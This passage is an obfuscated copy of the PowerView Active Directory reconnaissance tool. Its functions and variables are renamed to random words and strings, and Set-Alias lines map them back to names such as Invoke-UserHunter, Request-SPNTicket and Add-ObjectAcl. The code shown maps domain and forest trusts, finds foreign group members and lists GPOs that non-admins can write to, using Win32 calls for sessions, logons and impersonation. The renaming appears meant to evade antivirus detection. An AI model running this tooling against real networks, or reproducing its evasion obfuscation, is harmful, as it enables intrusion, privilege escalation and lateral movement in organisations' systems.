            $WqERlVcn99 = [IntPtr]::Zero
            $Flags = 63
            $AIgbaJvO99 = 0
            $yBCCHOLl99 = $ihwNTVTr99::DsEnumerateDomainTrusts($bfYHERMb99, $Flags, [ref]$WqERlVcn99, [ref]$AIgbaJvO99)
            $xPNHlFSC99 = $WqERlVcn99.ToInt64()
            if (($yBCCHOLl99 -eq 0) -and ($xPNHlFSC99 -gt 0)) {
                $PCXsuPYR99 = $hLfOSDnH99::GetSize()
                for ($i = 0; ($i -lt $AIgbaJvO99); $i++) {
                    $xuZeUKFb99 = New-Object System.Intptr -ArgumentList $xPNHlFSC99
                    $Info = $xuZeUKFb99 -as $hLfOSDnH99
                    $xPNHlFSC99 = $xuZeUKFb99.ToInt64()
                    $xPNHlFSC99 += $PCXsuPYR99
                    $nkSOUgNR99 = ''
                    $yBCCHOLl99 = $hAwLTjYU99::ConvertSidToStringSid($Info.DomainSid, [ref]$nkSOUgNR99);$TmohuzND99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($yBCCHOLl99 -eq 0) {
                        Write-Verbose "[interjects] Error: $(([ComponentModel.Win32Exception] $TmohuzND99).Message)"
                    }
                    else {
                        $JxkLuZvM99 = New-Object PSObject
                        $JxkLuZvM99 | Add-Member Noteproperty 'SourceName' $DPHZELvY99
                        $JxkLuZvM99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $JxkLuZvM99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $JxkLuZvM99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $JxkLuZvM99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $JxkLuZvM99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $JxkLuZvM99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $JxkLuZvM99 | Add-Member Noteproperty 'TargetSid' $nkSOUgNR99
                        $JxkLuZvM99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $JxkLuZvM99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $JxkLuZvM99
                    }
                }
                $Null = $ihwNTVTr99::NetApiBufferFree($WqERlVcn99)
            }
            else {
                Write-Verbose "[interjects] Error: $(([ComponentModel.Win32Exception] $yBCCHOLl99).Message)"
            }
        }
        else {
            $zLMvNifd99 = rompers @NetSearcherArguments
            if ($zLMvNifd99) {
                $zLMvNifd99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function survive {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $FoBFxbKO99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $EGjIQoLX99 = @{}
        if ($PSBoundParameters['Forest']) { $EGjIQoLX99['Forest'] = $FoBFxbKO99 }
        if ($PSBoundParameters['Credential']) { $EGjIQoLX99['Credential'] = $QWHERWHL99 }
        $frnjNViK99 = hangovers @NetForestArguments
        if ($frnjNViK99) {
            $frnjNViK99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function tangents {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        $qbMTjYnI99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['Raw']) { $qbMTjYnI99['Raw'] = $Raw }
    }
    PROCESS {
        melodrama @SearcherArguments  | ForEach-Object {
            ForEach ($oobIsdGn99 in $_.memberof) {
                $Index = $oobIsdGn99.IndexOf('DC=')
                if ($Index) {
                    $nskpWPxh99 = $($oobIsdGn99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $RbBEsCjF99 = $_.distinguishedname
                    $veGeMWdP99 = $RbBEsCjF99.IndexOf('DC=')
                    $wvZHbMee99 = $($_.distinguishedname.SubString($veGeMWdP99)) -replace 'DC=','' -replace ',','.'
                    if ($nskpWPxh99 -ne $wvZHbMee99) {
                        $PnKWBocM99 = $oobIsdGn99.Split(',')[0].split('=')[1]
                        $YKlcOVgF99 = New-Object PSObject
                        $YKlcOVgF99 | Add-Member Noteproperty 'UserDomain' $wvZHbMee99
                        $YKlcOVgF99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $YKlcOVgF99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $YKlcOVgF99 | Add-Member Noteproperty 'GroupDomain' $nskpWPxh99
                        $YKlcOVgF99 | Add-Member Noteproperty 'GroupName' $PnKWBocM99
                        $YKlcOVgF99 | Add-Member Noteproperty 'GroupDistinguishedName' $oobIsdGn99
                        $YKlcOVgF99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $YKlcOVgF99
                    }
                }
            }
        }
    }
}
function fixatives {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $lGQMWbBj99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        $qbMTjYnI99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Properties']) { $qbMTjYnI99['Properties'] = $IzcJvFdA99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['SecurityMasks']) { $qbMTjYnI99['SecurityMasks'] = $lGQMWbBj99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        if ($PSBoundParameters['Raw']) { $qbMTjYnI99['Raw'] = $Raw }
    }
    PROCESS {
        $wieMhtqV99 = @('Users', 'Domain Users', 'Guests')
        highfalutin @SearcherArguments | Where-Object { $wieMhtqV99 -notcontains $_.samaccountname } | ForEach-Object {
            $PnKWBocM99 = $_.samAccountName
            $aZQSTruC99 = $_.distinguishedname
            $nskpWPxh99 = $aZQSTruC99.SubString($aZQSTruC99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
            $_.member | ForEach-Object {
                $huTylNrc99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($nskpWPxh99 -ne $huTylNrc99)) {
                    $WXwOMHES99 = $_
                    $OtDsEBkS99 = $_.Split(',')[0].split('=')[1]
                    $jSpKLmtx99 = New-Object PSObject
                    $jSpKLmtx99 | Add-Member Noteproperty 'GroupDomain' $nskpWPxh99
                    $jSpKLmtx99 | Add-Member Noteproperty 'GroupName' $PnKWBocM99
                    $jSpKLmtx99 | Add-Member Noteproperty 'GroupDistinguishedName' $aZQSTruC99
                    $jSpKLmtx99 | Add-Member Noteproperty 'MemberDomain' $huTylNrc99
                    $jSpKLmtx99 | Add-Member Noteproperty 'MemberName' $OtDsEBkS99
                    $jSpKLmtx99 | Add-Member Noteproperty 'MemberDistinguishedName' $WXwOMHES99
                    $jSpKLmtx99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $jSpKLmtx99
                }
            }
        }
    }
}
function choreographed {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $IzcJvFdA99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $iqiYBoee99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    $EACcsJTT99 = @{}
    $QTZSRppO99 = New-Object System.Collections.Stack
    $kpKseiyu99 = @{}
    if ($PSBoundParameters['API']) { $kpKseiyu99['API'] = $API }
    if ($PSBoundParameters['NET']) { $kpKseiyu99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $kpKseiyu99['LDAPFilter'] = $aWyQQagT99 }
    if ($PSBoundParameters['Properties']) { $kpKseiyu99['Properties'] = $IzcJvFdA99 }
    if ($PSBoundParameters['SearchBase']) { $kpKseiyu99['SearchBase'] = $BffxXlHt99 }
    if ($PSBoundParameters['Server']) { $kpKseiyu99['Server'] = $vbyFupaI99 }
    if ($PSBoundParameters['SearchScope']) { $kpKseiyu99['SearchScope'] = $RVZhWaEH99 }
    if ($PSBoundParameters['ResultPageSize']) { $kpKseiyu99['ResultPageSize'] = $rguZwVJP99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $kpKseiyu99['ServerTimeLimit'] = $CRJCwXfg99 }
    if ($PSBoundParameters['Tombstone']) { $kpKseiyu99['Tombstone'] = $iqiYBoee99 }
    if ($PSBoundParameters['Credential']) { $kpKseiyu99['Credential'] = $QWHERWHL99 }
    if ($PSBoundParameters['Credential']) {
        $QQrelnJn99 = (rompers -QWHERWHL99 $QWHERWHL99).Name
    }
    else {
        $QQrelnJn99 = (rompers).Name
    }
    $QTZSRppO99.Push($QQrelnJn99)
    while($QTZSRppO99.Count -ne 0) {
        $CmuysoGL99 = $QTZSRppO99.Pop()
        if ($CmuysoGL99 -and ($CmuysoGL99.Trim() -ne '') -and (-not $EACcsJTT99.ContainsKey($CmuysoGL99))) {
            Write-Verbose "[choreographed] Enumerating trusts for domain: '$CmuysoGL99'"
            $Null = $EACcsJTT99.Add($CmuysoGL99, '')
            try {
                $kpKseiyu99['Domain'] = $CmuysoGL99
                $TxtqBNlh99 = interjects @DomainTrustArguments
                if ($TxtqBNlh99 -isnot [System.Array]) {
                    $TxtqBNlh99 = @($TxtqBNlh99)
                }
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $ZPtruLqN99 = @{}
                    if ($PSBoundParameters['Forest']) { $ZPtruLqN99['Forest'] = $FoBFxbKO99 }
                    if ($PSBoundParameters['Credential']) { $ZPtruLqN99['Credential'] = $QWHERWHL99 }
                    $TxtqBNlh99 += survive @ForestTrustArguments
                }
                if ($TxtqBNlh99) {
                    if ($TxtqBNlh99 -isnot [System.Array]) {
                        $TxtqBNlh99 = @($TxtqBNlh99)
                    }
                    ForEach ($Trust in $TxtqBNlh99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $QTZSRppO99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[choreographed] Error: $_"
            }
        }
    }
}
function otherwise {
    [CmdletBinding()]
    Param (
        [String]
        $fuAImXcd99 = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $pwwuwoRN99 = 200
    )
    $shOGpuXs99 = @('SYSTEM','Domain Admins','Enterprise Admins')
    $FoBFxbKO99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $ytTSHQSs99 = @($FoBFxbKO99.Domains)
    $QTZSRppO99 = $ytTSHQSs99 | foreach { $_.GetDirectoryEntry() }
    foreach ($CmuysoGL99 in $QTZSRppO99) {
        $iNUvqNTo99 = "(&(objectCategory=groupPolicyContainer)(displayname=$fuAImXcd99))"
        $oSFVEugC99 = New-Object System.DirectoryServices.DirectorySearcher
        $oSFVEugC99.SearchRoot = $CmuysoGL99
        $oSFVEugC99.Filter = $iNUvqNTo99
        $oSFVEugC99.PageSize = $pwwuwoRN99
        $oSFVEugC99.SearchScope = "Subtree"
        $TvvVCJVD99 = $oSFVEugC99.FindAll()
        foreach ($gpo in $TvvVCJVD99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $shOGpuXs99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $eogenvuN99 = New-Object psobject
            $eogenvuN99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $eogenvuN99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $eogenvuN99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $eogenvuN99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $eogenvuN99
        }
        }
    }
}
$Mod = cunning -ModuleName Win32
$KyRsTklh99 = cox $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$pVLuwBtV99 = cox $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$lzMGacfo99 = cox $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$lJOBqlGp99 = cox $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$zpmrJJDd99 = ump $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $lJOBqlGp99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$zaACcWJa99 = ump $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$AeITsOke99 = ump $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}
$uqtQknjP99 = ump $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}
$bKaekkVH99 = ump $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$sPbneiEH99 = cox $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$KPgEKbKj99 = ump $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}
$TPxWVUvd99 = ump $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $sPbneiEH99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = cox $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$ObPORSmE99 = cox $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$FTtEteKe99 = cox $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$hLfOSDnH99 = ump $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $ObPORSmE99
    TrustAttributes = field 5 $FTtEteKe99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$imYUabei99 = ump $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($imYUabei99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | Luvs -Module $Mod -Namespace 'Win32'
$ihwNTVTr99 = $Types['netapi32']
$hAwLTjYU99 = $Types['advapi32']
$XxKWqUCD99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
Set-Alias Get-IPAddress readjust
Set-Alias Convert-NameToSid Moroccans
Set-Alias Convert-SidToName vileness
Set-Alias Request-SPNTicket utilized
Set-Alias Get-DNSZone monarchic
Set-Alias Get-DNSRecord billfold
Set-Alias Get-NetDomain rompers
Set-Alias Get-NetDomainController Marsala
Set-Alias Get-NetForest hangovers
Set-Alias Get-NetForestDomain trusting
Set-Alias Get-NetForestCatalog junketed
Set-Alias Get-NetUser melodrama
Set-Alias Get-UserEvent bungler
Set-Alias Get-NetComputer beefsteaks
Set-Alias Get-ADObject monologue
Set-Alias Set-ADObject Buddhists
Set-Alias Get-ObjectAcl Naples
Set-Alias Add-ObjectAcl thighs
Set-Alias Invoke-ACLScanner hyphen
Set-Alias Get-GUIDMap discomposes
Set-Alias Get-NetOU headboards
Set-Alias Get-NetSite Javas
Set-Alias Get-NetSubnet shtik
Set-Alias Get-NetGroup highfalutin
Set-Alias Find-ManagedSecurityGroups Rabat
Set-Alias Get-NetGroupMember plowed
Set-Alias Get-NetFileServer Walmart
Set-Alias Get-DFSshare duns
Set-Alias Get-NetGPO Tahitians
Set-Alias Get-NetGPOGroup squawk
Set-Alias Find-GPOLocation disconnected
Set-Alias Find-GPOComputerAdmin coat
Set-Alias Get-LoggedOnLocal Colonial
Set-Alias Invoke-CheckLocalAdminAccess neoclassicism
Set-Alias Get-SiteName handed
Set-Alias Get-Proxy gads
Set-Alias Get-LastLoggedOn fills
Set-Alias Get-CachedRDPConnection la
Set-Alias Get-RegistryMountedDrive paragraphing
Set-Alias Get-NetProcess ratcheting
Set-Alias Invoke-ThreadedFunction recuperate
Set-Alias Invoke-UserHunter noxious
Set-Alias Invoke-ProcessHunter gelds
Set-Alias Invoke-EventHunter postponed
Set-Alias Invoke-ShareFinder irrelevancy
Set-Alias Invoke-FileFinder regulars
Set-Alias Invoke-EnumerateLocalAdmin fantasies
Set-Alias Get-NetDomainTrust interjects
Set-Alias Get-NetForestTrust survive
Set-Alias Find-ForeignUser tangents
Set-Alias Find-ForeignGroup fixatives
Set-Alias Invoke-MapDomainTrust choreographed
Set-Alias Get-DomainPolicy rationalists
